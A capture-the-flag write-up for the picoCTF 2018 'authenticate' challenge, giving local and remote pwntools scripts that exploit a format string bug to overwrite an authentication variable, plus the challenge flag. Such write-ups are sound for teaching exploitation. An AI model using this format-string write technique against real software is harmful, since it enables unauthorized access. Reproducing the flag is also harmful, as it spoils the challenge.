# authenticate
## Question
>Can you [authenticate](files/auth) to this service and get the flag? Connect with `nc 2018shell.picoctf.com 43438`. [Source](files/auth.c).

## Hint
>Just try the first thing that comes to mind.

# Solution
## Exploit locally
As we are provided with the executable, we can exploit it locally. After analyzing the source code, we understand that the program will only reveal the flag if the variable `authenticated` is set to `1`. We can exploit the format string vulnerability using the `pwntools` python framework as follows:

```python
from pwn import *
def exec_fmt(payload):
    proc = process('./auth')
    proc.sendlineafter("(yes/no)", payload)
    return proc.recvall()

e = ELF('./auth')
autofmt = FmtStr(exec_fmt)
authenticated = {e.symbols['authenticated']: 1}
payload = fmtstr_payload(autofmt.offset, authenticated)
log.info("Payload: {}".format(enhex(payload)))
print (exec_fmt(payload))
```

### Exploit remotely
Now let's exploit remotely (run `python exploit.py -r`):
```python
from pwn import *
import argparse
import os

LOCAL_PATH = "./auth"
REMOTE_PATH = ["2018shell.picoctf.com", 43438]

def get_process(is_remote = False):
    if is_remote:
        return remote(*REMOTE_PATH)
    else:
        return process(LOCAL_PATH)

def exec_fmt(payload, is_remote = False):
    proc = get_process(is_remote)
    proc.sendlineafter("(yes/no)", payload)
    return proc.recvall()

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--is_remote", help="Connect to remote server?", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
log.info("Address of 'authenticated': {}".format(hex(e.symbols['authenticated'])))

autofmt = FmtStr(exec_fmt)

writes = {e.symbols['authenticated']: 1}
payload = fmtstr_payload(autofmt.offset, writes)
log.info("Payload: {}".format(enhex(payload)))

print (exec_fmt(payload, args.is_remote))
```

# Flag
`picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0f2666af}`
